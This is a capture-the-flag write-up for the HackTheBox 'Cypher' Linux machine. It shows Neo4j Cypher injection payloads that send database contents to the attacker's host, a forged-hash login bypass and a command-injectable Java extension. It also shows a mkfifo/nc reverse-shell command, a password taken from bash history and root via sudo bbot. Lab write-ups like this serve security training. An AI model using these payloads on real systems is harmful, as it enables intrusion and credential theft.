+++
title = "Cypher - HTB Machine"
date = "2025-12-20"
weight = 0
[taxonomies]
tags=["HTB", "Machine", "cypher", "neo4j", "command-injection", "bbot", "tool", "SUID"]
difficulty=["medium"]
writeup=["HTB-machine"]
os=["linux"]
+++


# Recon

As the name suggests, this medium-difficulty Linux box features a Neo4j graph database, which we exploit using both **Cypher injection** and **command injection** of a custom APOC extension. Rooting the box we (cheese the flag) develop a module for the `bbot` tool, as we can execute it as `sudo`.

## nmap

```bash
# Nmap 7.95 scan initiated Thu May 22 18:19:25 2025 as: /usr/lib/nmap/nmap -sC -sV -oA nmap/cypher -vv 10.129.215.22
Nmap scan report for cypher.htb (10.129.215.22)
Host is up, received reset ttl 63 (0.033s latency).
Scanned at 2025-05-22 18:19:26 CEST for 8s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: GRAPH ASM
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 22 18:19:34 2025 -- 1 IP address (1 host up) scanned in 9.11 seconds
```

Pretty basic box. Let's look at the website.


## Busting

```bash
┌──(kali㉿kali)-[~/htb/box/cypher]
└─$ feroxbuster -u http://cypher.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cypher.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      126l      274w     3671c http://cypher.htb/login
200      GET        3l      113w     8123c http://cypher.htb/bootstrap-notify.min.js
200      GET       63l      139w     1548c http://cypher.htb/utils.js
200      GET      179l      477w     4986c http://cypher.htb/about
307      GET        0l        0w        0c http://cypher.htb/demo => http://cypher.htb/login
307      GET        0l        0w        0c http://cypher.htb/api => http://cypher.htb/api/docs
307      GET        0l        0w        0c http://cypher.htb/api/ => http://cypher.htb/api/api
405      GET        1l        3w       31c http://cypher.htb/api/auth
[...SNIP...]
[####################] - 53s    30000/30000   568/s   http://cypher.htb/
[####################] - 0s     30000/30000   63425/s http://cypher.htb/testing/ => Directory listing (add --scan-dir-listings to scan)
```

We see:
- `/api` 
- `/testing` 

And in `/testing` we see a directory listing:

- `custom-apoc-extension-1.0-SNAPSHOT.jar`

Which is a custom extension for Neo4j's Cypher, which we will be using later to do command injection!

# Web

On the website, we can try to login, however we cannot register and we have no credentials


## Cypher Exfiltration 

Attacking the `/api/auth` endpoint we saw earlier with Cypher injection

Normal SQL injection like methods of `' OR 1=1 --` dont work here. However if we cause an error we can leak the query:

```
neo4j.exceptions.CypherSyntaxError: {code: Neo.ClientError.Statement.SyntaxError} {message: Failed to parse string literal. The query must contain an even number of non-escaped quotes. (line 1, column 60 (offset: 59))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin'' return h.value as hash"
  ^}
```

So we know the full query is:

```sql
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '<INPUT>' return h.value as hash
```

Initially I tried if I could exfiltrate some data from the database:

I gathered some payloads from [Neo4jection: Secrets, Data, and Cloud Exploits](https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits#extracting-data-from-neo4j)

```http
POST /api/auth HTTP/1.1
Host: cypher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 158
Origin: http://cypher.htb
DNT: 1
Connection: keep-alive
Referer: http://cypher.htb/login
Priority: u=0

{"username":"admin' RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://10.10.14.111/?l='+label as l RETURN 0 as _0 //","password":"adad"}
```

Setting up a quick http server, we can see the query and partials exfiltration working:
```bash
└─$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.215.22 - - [22/May/2025 20:45:19] "GET /?l=USER HTTP/1.1" 200 -
10.129.215.22 - - [22/May/2025 20:45:19] "GET /?l=HASH HTTP/1.1" 200 -
10.129.215.22 - - [22/May/2025 20:45:19] "GET /?l=DNS_NAME HTTP/1.1" 200 -
10.129.215.22 - - [22/May/2025 20:45:19] "GET /?l=SHA1 HTTP/1.1" 200 -
10.129.215.22 - - [22/May/2025 20:45:20] "GET /?l=SCAN HTTP/1.1" 200 -
10.129.215.22 - - [22/May/2025 20:45:20] "GET /?l=ORG_STUB HTTP/1.1" 200 -
10.129.215.22 - - [22/May/2025 20:45:20] "GET /?l=IP_ADDRESS HTTP/1.1" 200 -
```

So we have the labels:
- `USER`
- `HASH`
- `DNS_NAME`
- `SHA1`
- `SCAN`
- `ORG_STUB`
- `IP_ADDRESS`



We can exfiltrate username and hash:

```HTTP
POST /api/auth HTTP/1.1
Host: cypher.htb
[...SNIP...]

{"username":"admin' OR 1=1 WITH 1 as a MATCH (f:USER) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.111/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 // ","password":"password"}
```

```bash
10.129.215.22 - - [22/May/2025 21:20:42] "GET /?name=graphasm HTTP/1.1" 200 -
```

and likewise the hash:

```bash
10.129.215.22 - - [22/May/2025 21:30:47] "GET /?value=9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1" 200 -
```

However the hash does not crack. Input the preimage of the hash to login.

## Bypass login

Instead we make the query return the hash we want! First we compute the hash of `password`

```bash
└─$ echo -n "password" | sha1sum
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8  -
```

Then we terminate the query early, returning the hash we want:


```http
POST /api/auth HTTP/1.1
Host: cypher.htb
[...SNIP...]

{"username":"graphasm' return '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' as hash //","password":"password"}
```

```
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 23 May 2025 08:05:33 GMT
Content-Length: 2
Connection: keep-alive
set-cookie: access-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJncmFwaGFzbScgcmV0dXJuICc1YmFhNjFlNGM5YjkzZjNmMDY4MjI1MGI2Y2Y4MzMxYjdlZTY4ZmQ4JyBhcyBoYXNoIC8vIiwiZXhwIjoxNzQ4MDMwNzMzfQ._Bpk5f875-uf5zLWI395QUaWm_mwZ4QC8PgyHLQW9kU; Path=/; SameSite=lax

ok
```

And this logs us in!


## Command injection - Custom apoc cypher extension


We can make queries using the labels discovered earlier, but given that we have a custom APOC extension in our hands that is what is the most interesting.

```java
package com.cypher.neo4j.apoc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;
import org.neo4j.procedure.Description;
import org.neo4j.procedure.Mode;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

public class CustomFunctions {
   @Procedure(
      name = "custom.getUrlStatusCode",
      mode = Mode.READ
   )
   @Description("Returns the HTTP status code for the given URL as a string")
   public Stream<CustomFunctions.StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
      if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
         url = "https://" + url;
      }

      String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
      System.out.println("Command: " + Arrays.toString(command));
      Process process = Runtime.getRuntime().exec(command);
      BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
      BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
      StringBuilder errorOutput = new StringBuilder();

      String line;
      while((line = errorReader.readLine()) != null) {
         errorOutput.append(line).append("\n");
      }

      String statusCode = inputReader.readLine();
      System.out.println("Status code: " + statusCode);
      boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
      if (!exited) {
         process.destroyForcibly();
         statusCode = "0";
         System.err.println("Process timed out after 10 seconds");
      } else {
         int exitCode = process.exitValue();
         if (exitCode != 0) {
            statusCode = "0";
            System.err.println("Process exited with code " + exitCode);
         }
      }

      if (errorOutput.length() > 0) {
         System.err.println("Error output:\n" + errorOutput.toString());
      }

      return Stream.of(new CustomFunctions.StringOutput(statusCode));
   }

   public static class StringOutput {
      public String statusCode;

      public StringOutput(String statusCode) {
         this.statusCode = statusCode;
      }
   }
}
```

If we look at the code we can see that:
```java
String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
```
`curl -s -o /dev/null --connect-timeout 1 -w %{http_code} <USER_INPUT>`. So we can perform command injection


```SQL
MATCH (u:USER)  CALL custom.getUrlStatusCode(";cat /etc/passwd|grep graphasm|base64") YIELD statusCode RETURN statusCode
```

Decodes to:
```bash
graphasm:x:1000:1000:graphasm:/home/graphasm:/bin/bash
```

Trying to cheese the flag: 

```SQL
MATCH (u:USER)  CALL custom.getUrlStatusCode(";ls /home/g*/|base64") YIELD statusCode RETURN statusCode
```

```SQL
MATCH (u:USER)  CALL custom.getUrlStatusCode(";cat /home/g*/user.txt|base64") YIELD statusCode RETURN statusCode
```
return only `000` so I guess the executing user doesn't have the required rights.

I will just try to get a shell. And this one works:

```SQL
MATCH (u:USER)  CALL custom.getUrlStatusCode(";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.111 9001 >/tmp/f") YIELD statusCode RETURN statusCode
```

# Shell as `neo4j`

The home of the `neo4j` user:

```bash
neo4j@cypher:~$ ls
ls
certificates  import  licenses	      plugins	run
data	      labs    packaging_info  products
neo4j@cypher:~$ ls -la
ls -la
total 52
drwxr-xr-x 11 neo4j adm   4096 Feb 17 16:39 .
drwxr-xr-x 50 root  root  4096 Feb 17 16:48 ..
-rw-r--r--  1 neo4j neo4j   63 Oct  8  2024 .bash_history
drwxrwxr-x  3 neo4j adm   4096 Oct  8  2024 .cache
drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 certificates
drwxr-xr-x  6 neo4j adm   4096 Oct  8  2024 data
drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 import
drwxr-xr-x  2 neo4j adm   4096 Feb 17 16:24 labs
drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 licenses
-rw-r--r--  1 neo4j adm     52 Oct  2  2024 packaging_info
drwxr-xr-x  2 neo4j adm   4096 Feb 17 16:24 plugins
drwxr-xr-x  2 neo4j adm   4096 Feb 17 16:24 products
drwxr-xr-x  2 neo4j adm   4096 May 22 16:16 run
lrwxrwxrwx  1 neo4j adm      9 Oct  8  2024 .viminfo -> /dev/null
```

We also see that there is kept a history of bash commands. Usually it is pointed to the void (`/dev/null`), for machines on HTB.

Grepping for 'password' reveals credentials in the bash history:

```bash
neo4j@cypher:~$ grep -r "password" .
grep -r "password" .
grep: ./data/databases/system/neostore.propertystore.db.index.keys: binary file matches
grep: ./data/transactions/system/neostore.transaction.db.0: binary file matches
./.bash_history:neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
```


So, we can connect through SSH to the box as the `graphasm` user with the password

```bash
┌──(kali㉿kali)-[~/htb/box/cypher]
└─$ ssh graphasm@cypher.htb                                                       
The authenticity of host 'cypher.htb (10.129.215.22)' can't be established.
ED25519 key fingerprint is SHA256:u2MemzvhD6xY6z0eZp5B2G3vFuG+dPBlRFrZ66gaXZw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cypher.htb' (ED25519) to the list of known hosts.
graphasm@cypher.htb's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri May 23 08:39:33 AM UTC 2025

  System load:  0.0               Processes:             236
  Usage of /:   72.6% of 8.50GB   Users logged in:       0
  Memory usage: 58%               IPv4 address for eth0: 10.129.215.22
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri May 23 08:39:34 2025 from 10.10.14.111
```
# Shell as `graphasm`

We finally find the real user:

```bash
graphasm@cypher:~$ ls -la
total 36
drwxr-xr-x 4 graphasm graphasm 4096 Feb 17 12:40 .
drwxr-xr-x 3 root     root     4096 Oct  8  2024 ..
lrwxrwxrwx 1 root     root        9 Oct  8  2024 .bash_history -> /dev/null
-rw-r--r-- 1 graphasm graphasm  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 graphasm graphasm 3771 Mar 31  2024 .bashrc
-rw-r--r-- 1 graphasm graphasm  156 Feb 14 12:35 bbot_preset.yml
drwx------ 2 graphasm graphasm 4096 Oct  8  2024 .cache
-rw-r--r-- 1 graphasm graphasm  807 Mar 31  2024 .profile
drwx------ 2 graphasm graphasm 4096 Oct  8  2024 .ssh
-rw-r----- 1 root     graphasm   33 May 22 16:17 user.txt
graphasm@cypher:~$ wc user.txt 
 1  1 33 user.txt
```

That's why we couldn't read the flag with the command injection, as the custom extension was running as the `neo4j` user.


# Root

## Cheesing the flag

```bash
graphasm@cypher:~$ cat bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

We can see the domain: `ecorp.htb`. (I didn't show this earlier, but we could find the same domain name by exfiltrating the value of the label `DNS_NAME`.)

Running `sudo -l` reveals: 

```bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

Running `sudo /usr/local/bin/bbot --help` to see if I can include a file somehow and let `bbot` include it. I think `--targets` and `--whitelist` are options that allow reading of files.

We can cheese the root flag by run the binary in a more verbose mode with `--debug`:

```bash
graphasm@cypher:~$ sudo /usr/local/bin/bbot -t /root/root.txt -w /root/root.txt  --debug
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

[INFO] Reading targets from file: /root/root.txt
[INFO] Reading whitelist from file: /root/root.txt
[DBUG] Preset bbot_cli_main: Adding module "json" of type "output"
[...SNIP...]
[DBUG] internal.excavate: Including Submodule ErrorExtractor
[DBUG] internal.excavate: Including Submodule FunctionalityExtractor
[DBUG] internal.excavate: Including Submodule HostnameExtractor
[DBUG] Generated Regex [(([a-z0-9-]+\.)+ef0aefc75c4a7b5bac448c835557e62e)] for domain ef0aefc75c4a7b5bac448c835557e62e
[DBUG] internal.excavate: Including Submodule JWTExtractor
[DBUG] internal.excavate: Including Submodule NonHttpSchemeExtractor
[DBUG] internal.excavate: Including Submodule ParameterExtractor
[...SNIP...]
[DBUG] Setting intercept module cloudcheck._incoming_event_queue to previous intercept module dnsresolve.outgoing_event_queue
[DBUG] Setting intercept module _scan_egress._incoming_event_queue to previous intercept module cloudcheck.outgoing_event_queue
[SUCC] Setup succeeded for 12/12 modules.
[TRCE] Command: /usr/local/bin/bbot -t /root/root.txt -w /root/root.txt --debug
[SUCC] Scan ready. Press enter to execute diabolic_jennifer
```

We have 'cheesed' the flag with the target flag: `-t`, but this isn't exactly a compromise of the system!

The intended way is to create a module for the [bbot by blacklanternsecurity](https://github.com/blacklanternsecurity/bbot) and have it drop you into a shell.

So that's what I did here:

- https://github.com/Smavl/bbot-shell/

```bash
graphasm@cypher:~$ cat bbot_slim.yml 
module_dirs:
  - /home/graphasm/mod_dir

graphasm@cypher:~$ ls -la mod_dir/
total 12
drwxrwxr-x 2 graphasm graphasm 4096 May 23 12:35 .
drwxr-xr-x 8 graphasm graphasm 4096 May 23 12:36 ..
-rw-rw-r-- 1 graphasm graphasm 1881 May 23 12:35 shell.py
graphasm@cypher:~$ sudo /usr/local/bin/bbot -m shell -p /home/graphasm/bbot_slim.yml 
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

[INFO] Scan with 1 modules seeded with 0 targets (0 in whitelist)
[INFO] Loaded 1/1 scan modules (shell)
[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
[INFO] shell: Shell module loading
[INFO] shell: Binary: /usr/bin/bash was found

[SUCC] shell: Spawning shell: /usr/bin/bash as root

root@cypher:/home/graphasm# id
uid=0(root) gid=0(root) groups=0(root)
root@cypher:/home/graphasm# wc /root/root*
 1  1 33 /root/root.txt
```

